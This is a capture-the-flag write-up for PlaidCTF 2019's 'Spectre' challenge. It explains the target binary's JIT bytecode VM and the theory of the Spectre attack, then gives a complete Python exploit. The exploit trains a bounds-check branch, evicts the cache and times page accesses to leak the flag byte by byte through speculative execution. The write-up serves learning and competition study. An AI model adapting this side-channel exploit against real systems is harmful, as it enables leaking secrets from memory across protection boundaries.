# Plaid CTF 2019 : Spectre

Spectre is a critical vulnerability in modern processors, which allows programs to steal data which is currently processed in memory. As the name of the challenge indicates, we should complete a spectre attack.

## Static Analysis

It's not hard to figure out what does the binary do:

1. calloc(0x1030) as input buffer;

2. load flag at offset 0x1020 of input buffer;

3. read 0x1000 bytes into input buffer from stdin at most;

4. mmap space of size 0x400000 at address 0x133700000000 as code segment;

5. mmap space of size 0x2000000 at address 0x414100000000 as data segment;

6. translate our input into JIT code, from input buffer to code segment;

7. set code segment as r-x, this means we can't edit our code once the translation is completed;

8. put builtin\_bc's pointer at offset 0x1008 of input buffer;

9. put builtin\_time's pointer at offset 0x1010 of input buffer;

10. put rdtsc's pointer at offset 0x1018 of inputbuffer;

11. execute code segment;

12. print the first 0x1000 bytes of data segment.

The memory layout is shown below:

![image](https://github.com/kongjiadongyuan/image_in_a_mess/raw/master/2019-4-19.png)

There is no way to reach buffer overflow, so we have to do what we are disigned to do.

Let's have a look at builtin\_bc and builtin\_time briefly:

```c
signed __int64 __fastcall builtin_bc(unsigned __int64 a1)
{
  signed __int64 result; // rax

  result = -1LL;
  if ( *the_vm > a1 )
    result = *((unsigned __int8 *)the_vm + a1 + 8);
  return result;
}
```

```c
__int64 __fastcall builtin_time(__int64 a1, __int64 a2, __int64 a3)
{
  return *((unsigned __int8 *)the_vm + 0x1020) - the_vm[515] + rdtsc(0, a3);
}
```

Function builtin\_bc is a typical victim function in spectre's exploitation, we have to train the branch jump so it can pre-execute our malicious code;

Function builtin\_time looks some strange, it uses the\_vm\[515], but it won't affect the result as we wouldn't use it directly. The author should have call rdtsc directly, but he added flag's first byte in this function, there must be some purpose. In fact, it can put the flag into cpu's cache (if it wasn't in cache before), this is import when we try to abuse branch prediction.

## Dealing with bytecode and IO

There's nothing need detailed description, I wrote a small tool to deal with these fussy things. I have put it on my github, you can refer to it when you try to complete your own exp.

[https://github.com/kongjiadongyuan/pwn-study/tree/master/2019-pctf/spectre](https://github.com/kongjiadongyuan/pwn-study/tree/master/2019-pctf/spectre)

There are some points we should take care:

    1. we can only use r8 ~ r15 as we generate our code;
    
    2. loop target depent on the bytecode's length;

More details of this part come from reversing and debugging, good luck.

## Spectre's principle

There is a lot of information on this problem, and I will only explain briefly here.

Firstly, we should know two important mechanism of our processor, branch prediction and memory cache.

Branch prediction comes from cpu's out-of-order execution. When cpu encounters conditional jump statement like jle, je, it will guess the result of them, and predictive execute the "true" branch, if the "true" branch is confirmed as false, then the predictive execution will be "abandoned", and it looks **almost** as if it hasn't been executed.

However, it does affect something. Once the "false" branch executed, cpu will put the page into cache if they're accessed, and even "false" branch has been abandoned, the pages are not fetched out of cache, which gives us a chance to channel attack.

## Algorithm

The strategy is obvious now:

1. Flush 256 pages of memory out of cpu's cache in data segment;

2. Train builtin\_bc to let it jump to the "true" branch by default, more specifically:

   ```c
   if ( *the_vm > a1 )
       result = *((unsigned __int8 *)the_vm + a1 + 8);
   ```

        Let the conditional statement always be true, and when we give it "false" the first time, cpu will predictive execute the next statement, whether it is legal or not. We just let "a1" be the index of one of flag's byte, we can fetch   it in a branch which will not be  actual executed.

3. Use the byte we have fetched to access the corresponding page:

   After the function builtin\_bc returned (of cource in predictive executed branch), we "have" a byte of flag, and we access \*(0x414100000000 + x << 12), read or write are both ok. Now we can put the page into cpu's cache.

   For example, the first byte of flag is 'p', we then access the address of (0x414100000000 + 0x70 << 12), and it will be put into cache, when we finally measure the time we access it again, the time will significantly reduce compared to those which are not cached, then we can know the first byte is 'p'.

4. Measure the time we access each page, and get the result.

## Exploit and Details

Here is my exploit:

```python
from pwn import *
from translator import *
DEBUG =0 

r8 = 0
r9 = 1
r10 = 2
r11 = 3
r12 = 4
r13 = 5
r14 = 6
r15 = 7

threshold = 0x50

if DEBUG: 
    p = process(['./spectre', 'flag'])
# context.log_level = 'debug'
def init(c):
    c.movc(r10, 0)
    # i = 0

    l_target = c.getloop()
    #loopstart

    c.movc(r9, 2) 
    c.mov(r8, r10)
    c.shl(r8, r9)
    # r8 = i << 2 (i * 4)

    c.movc(r9, 0xffffffff)
    c.store(r8, r9)
    # *(0x414100000000 + i * 4) = 0xffffffff

    c.movc(r9, 1)
    c.add(r10, r9)
    # i = i + 1

    c.loop(0x40000, l_target, r10)


def train_bc(c):
    for i in range(50):
        c.movc(r8, 0x1000 - 0x8)
        c.bc()

def cache_clear(c):
    c.movc(r11, 0)
    l_target2 = c.getloop()
    c.movc(r10, 0x101000)
    l_target1 = c.getloop()
    c.mov(r8, r10)
    c.load(r8, r8)
    c.movc(r9, 4)
    c.add(r10, r9)
    c.loop(0x1fff000, l_target1, r10)
    c.movc(r9, 1)
    c.add(r11, r9)
    c.loop(0x10, l_target2, r11)

def train_jle(c):
    target_l = c.getloop()
    c.movc(r9, 0x200)
    for i in range(0x100):
        c.loop(0x20, target_l, r9)

def delay_fence(c):
    c.movc(r10, 0)
    target_l = c.getloop()
    c.movc(r9, 1)
    c.add(r10, r9)
    c.loop(0x100, target_l, r10)

def attack(c, offset):
    c.movc(r11, 56)
    c.movc(r12, 56 - 12)
    c.movc(r8, 0x1018 + offset)
    c.bc()
    c.shl(r8, r11)
    c.shr(r8, r12)
    c.load(r9, r8)

def check(c, addr):
    c.movc(r10, addr)
    c.time(r9)
    c.load(r10, r10)
    c.time(r8)
    c.sub(r8, r9)

def check_all(c):
    c.movc(r15, 0)

    target_l = c.getloop()

    c.mov(r11, r15)
    c.movc(r9, 0x6)
    c.shl(r11 , r9)
    c.add(r11, r15)
    c.movc(r9, 0xff)
    c.uand(r11, r9)

    c.movc(r9, 12)
    c.mov(r12, r11)
    c.shl(r12, r9)
    c.time(r9)
    c.load(r12, r12)
    c.time(r8)
    c.sub(r8, r9)
    c.mov(r12, r11)
    c.movc(r9, 3)
    c.shl(r12, r9)
    c.store(r12, r8)

    c.movc(r9, 1)
    c.add(r15, r9)
    c.loop(0x100, target_l, r15)



def main(secret):
    if DEBUG:
        pause()
    c = Translator()
    c.start()

    init(c)

    train_bc(c)

    cache_clear(c)

    delay_fence(c)


    c.time()

    attack(c, secret)

    check_all(c)

    c.complete()

    if not DEBUG:
        final =  c.go()
        result = []
        for i in range(0x100):
            result.append(final[i * 2])
        return result
    else:
        p.send(c.content)

def explode():
    idx = 0 
    result = ''
    score = []
    count = 0
    for i in range(0x100):
        score.append(0)
    def ok(c):
        if c >= 32 and c <= 126:
            return True
        else:
            return False
    def clr(score):
        for i in range(0x100):
            score[i] = 0
    def chk(score):
        for i in range(0x100):
            if score[i] == 1:
                return i
        return -1
    while(True):
        tmp = main(idx)
        for i in range(len(tmp)):
            if tmp[i] < threshold and ok(i):
                score[i] += 1
        if not chk(score) == -1:
            result += chr(chk(score))
            if idx == 0x10:
                return result
            idx += 1
            clr(score)
        count += 1
        printlist(tmp)
        print 'result: ' + result
        print 'count:  ' + str(count)

def printlist(result):
    pstream = ''
    for i in range(0x100):
        pstream += hex(i) + ': ' + hex(result[i]).ljust(5) + '\t'
        if i % 8 == 0 and not i == 0:
            pstream += '\n'
    print pstream



if __name__ == '__main__':
    if len(sys.argv) > 1:
        secret = int(sys.argv[1])
    else:
        secret = 0

    if not DEBUG:
        explode()

    if DEBUG:
        main(secret)
        result = []
        for i in range(0x100):
            result.append(u64(p.recv(8)))
        printlist(result)
```

The stage is well devided in main function, and I'll explain some points which I think is important.

Firstly, we can't call \_mm\_clflush in this binary, which is used in spectre's exploit to flush a page out of cpu cache. So we have to find a method to do the same thing. In my exploit, I do this by constantly accessing the pages we don't need. In function cache\_clear, I use memory from offset 0x101000 to 0x1fff000 (the base is 0x414100000000), which is far more than the cache size of cpu (which is usually 3M). When the cache is full, it will clear out the pages we care about, which is page from offset 0x00 to 0x100000, exactly 0x100 pages, corresponding to 0x100 ascii character.

Secondly, training builtin\_bc should directly repeat in assembly level, not loop, which will bring some unexpected problems.

Thirdly, we should make sure the time of cpu executing from conditional branch to our target "false" branch as short as possible. As we know, fetching data from memory is far more slow than from cache, so we must put the page where flag exist into cache, to make sure the "false" branch can reach the point we want before the conditional judgement finish, which will cause the whole "false" branch abandoned.

Finally, after we trying to trigger cache flush in function cache\_clear, we'd better give cpu some time to complete the flush operation, which will improve the success rate. I did this by adding null loop. This is what I didn't notice when the competition is open.

When measure the time we access each page, we should make sure we do this in random order (at lease in cpu's view), so I access this in order ( i \* 67 ) & 0xff, in case the cpu put the next page into cache in advance.

# Conclusion

This challenge is not hard if we do know the principle of spectre, but obviously, I didn't before I get this challenge.

My english is poor, and I hope you can understand what I mean. Good Luck.
